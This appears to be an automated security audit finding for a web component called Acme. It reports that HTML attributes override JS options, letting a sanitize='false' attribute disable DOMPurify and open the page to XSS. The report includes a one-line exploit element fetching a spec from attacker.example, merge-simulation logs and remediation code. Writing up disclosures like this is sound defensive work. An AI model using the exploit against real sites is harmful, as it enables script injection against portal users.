# [H4] Html Attribute Overrides Js Options

## Summary

`Acme.init()` merges options as `{ ...options, ...parseOptionsFromElement(element) }`, where `parseOptionsFromElement` reads every HTML attribute off the `<acme>` DOM element. Because the element-attribute object is spread **after** the JS-supplied options object, any HTML attribute on the `<acme>` element unconditionally overrides the corresponding JS option — including security-sensitive options such as `sanitize`.

This creates a trust-boundary collapse in CMS and platform contexts: if the embedding page allows the same principal who authored the OpenAPI spec to also set HTML attributes on the `<acme>` element (which is common in CMS systems that allow raw HTML in articles, or in iframe-less embedding where untrusted spec content is in the same DOM), that principal can disable sanitization even if the host application explicitly passed `sanitize: true` in its JS `options` argument.

## Severity, Confidence, Vulnerability Type

- **Severity**: High
- **Confidence**: Confirmed (PoC executed)
- **Vulnerability Type**: hidden-control-channel
- **Triage-Priority**: P1

## Impact

From `evidence/impact.log`:

```
H4 — Impact Evidence
====================
Date: 2026-05-19

Vulnerability: HTML attribute on <acme> element unconditionally overrides JS-supplied options
Affected file: src/standalone.tsx:70
Vulnerable line:
  options: { ...options, ...parseOptionsFromElement(element) },

SECURITY IMPACT — Scenario A (primary)
---------------------------------------
Attack surface:
  Acme.init(specUrl, { sanitize: true }, element)
  — host application explicitly enables DOMPurify sanitization to protect
    against XSS from untrusted OpenAPI specs.

Attacker capability required:
  Write a single HTML attribute on the <acme> DOM element.
  This is possible via:
  - CMS raw-HTML passthrough (WordPress, Contentful rich-text with HTML blocks)
  - DOM-injection primitive (stored/reflected XSS elsewhere in page)
  - Editor/content-team account compromise in multi-tenant portals

Exploit:
  <acme spec-url="https://attacker.example/evil.yaml" sanitize="false"></acme>

Outcome:
  1. parseOptionsFromElement() reads sanitize="false" from element attributes
  2. Spread at line 70 overwrites jsOptions.sanitize = true with "false" (string)
  3. argValueToBoolean("false") returns Boolean false (AcmeNormalizedOptions.ts:80-81)
  4. this.sanitize = false → SanitizedMdBlock.tsx:31 skips dompurify.sanitize()
  5. Raw HTML from spec descriptions is injected via dangerouslySetInnerHTML
  6. Attacker-controlled <script> / onerror payloads execute in portal origin

DOMPurify bypass confirmed:
  JS options.san
…(truncated)

```

## Affected Component


## Source to Sink Flow

Primary site: ``. See draft.md for the full trace.

## Vulnerable Code

**Merge order (standalone.tsx:70):**
```ts
options: { ...options, ...parseOptionsFromElement(element) },
```
The spread order is `JS options` first, then `element attributes` — element attributes win unconditionally.

**Attribute parsing (standalone.tsx:31-41):**
```ts
function parseOptionsFromElement(element: Element) {
  const attrMap = attributesMap(element);
  const res = {};
  for (const attrName in attrMap) {
    const optionName = attrName.replace(/-(.)/g, (_, $1) => $1.toUpperCase());
    const optionValue = attrMap[attrName];
    res[optionName] = attrName === 'theme' ? JSON.parse(optionValue) : optionValue;
  }
  return res;
}
```
There is no filtering or allowlist of attribute names. Every attribute becomes an option key. Including `sanitize`.

**Affected option normalization:**
`argValueToBoolean` treats any non-`"false"` string as `true` and any string `"false"` as `false` (AcmeNormalizedOptions.ts:76-83). Therefore `<acme sanitize="false">` sets `sanitize = false` exactly. An attacker who can write `<acme sanitize="false">` onto the DOM element defeats the JS `options.sanitize = true` protection.

- Guard stack observed: none — no filtering in `parseOptionsFromElement`
- Object-id parameter: n/a
- Ownership clause: n/a

## Proof of concept & Evidence

**PoC-Status**: executed

Evidence files under `evidence/`:
- `evidence/exploit.html`
- `evidence/exploit.log`
- `evidence/impact.log`
- `evidence/poc.js`

Decisive output from `evidence/exploit.log`:
```
=== H4 Static Source Verification ===

[1] Vulnerable merge order in standalone.tsx:
    Pattern: { ...options, ...parseOptionsFromElement(element) }
    FOUND: true

[2] argValueToBoolean used for sanitize in AcmeNormalizedOptions.ts:
    FOUND: true

[3] Exact vulnerable line (standalone.tsx:70):
    options: { ...options, ...parseOptionsFromElement(element) },

=== Merge Simulation ===

Host JS options:         { sanitize: true }
Element attrs parsed:    { specUrl: 'https://attacker.example/evil.yaml', sanitize: 'false' }
Merged (line 70):        { sanitize: 'false', specUrl: 'https://attacker.example/evil.yaml' }
Final sanitize value:    false

Sanitization gate DISABLED by HTML attribute? true

--- Scenario B: autoInit({}) with no sanitize in JS ---
Merged (autoInit):        { specUrl: 'https://attacker.example/evil.yaml', sanitize: 'false' }
Final sanitize value:     false
Sanitize gate disabled?   true

--- Scenario C: JSON.parse crash on malformed theme attr ---
SyntaxError thrown: Unterminated string in JSON at position 15 (line 1 column 16)
DoS (init crash) confirmed: true

[4] exploit.html written to: /Users/<user>/Desktop/oss-to-run/acme/archon/findings/H4-html-attribute-overrides-js-options/evidence/exploit.html
{"status":"confirmed","evidence":"sanitize option forced to false by HTML attribute \"sanitize=false\" overriding JS options.sanitize=true at standalone.tsx:70 spread merge","notes":"argValueToBoolean(\"false\") === false confirmed; DOMPurify gate disabled; XSS in spec Markdown descriptions possible"}

```

## Preconditions

- **Auth-Required**: no
- **Auth-Roles**: anonymous
- **Protocol**: local
- **Attack vector**: Remote (network); attacker must control or influence the OpenAPI spec rendered by Acme.

## Remediation

Apply a two-tier merge strategy: security-sensitive options supplied via JS should not be overridable by HTML attributes. Specifically:
```ts
const elementOptions = parseOptionsFromElement(element);
const securitySensitiveKeys = ['sanitize', 'untrustedSpec'];
// Remove any security-sensitive keys from element options to prevent override
for (const key of securitySensitiveKeys) {
  delete elementOptions[key];
}
options = { ...options, ...elementOptions };
```
Alternatively, change the merge order to `{ ...parseOptionsFromElement(element), ...options }` so JS-supplied options always win — though this breaks the expected HTML-attribute-based configuration for non-security options.

Additionally, add a console warning when a `sanitize` or `untrustedSpec` attribute is found on the element, to help developers discover unintended configurations.

Confirm-Status: confirmed-test
Confirm-Method: generated-test
Confirm-Test: archon/findings/H4-html-attribute-overrides-js-options/confirm-test.test.ts
Confirm-Test-Output: archon/findings/H4-html-attribute-overrides-js-options/confirm-test-output.log
Confirm-Test-Identity: none
Confirm-Timestamp: 2026-05-19T04:13:21Z
Confirm-Notes: Generated a Jest reproducer in local mode. Existing tests in src/__tests__/standalone.test.tsx and src/__tests__/ssr.test.tsx only cover loading/SSR and would not detect attacker-controlled HTML attributes overriding JS options. The new test creates a <acme sanitize="false"> element, calls init(..., { sanitize: true }, element), captures the rendered props, and confirms the merged options carry sanitize='false', which normalizes to boolean false via argValueToBoolean().
